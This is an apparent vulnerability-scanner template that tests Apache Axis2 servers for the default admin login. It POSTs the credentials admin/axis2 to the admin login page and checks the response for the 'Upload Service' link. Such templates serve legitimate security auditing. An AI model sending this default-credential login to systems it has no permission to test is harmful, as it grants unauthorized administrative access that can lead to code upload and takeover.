name: poc-yaml-axis2-default-password
rules:
  - method: POST
    path: "/axis2/axis2-admin/login"
    body: |
      userName=admin&password=axis2&submit=+Login+
    follow_redirects: true
    expression: |
      response.status == 200 && r'<a href="axis2-admin/upload">Upload Service</a>'.bmatches(response.body)
detail:
  author: flyinbed
  links:
    - "https://blog.csdn.net/weixin_33850015/article/details/86353251"
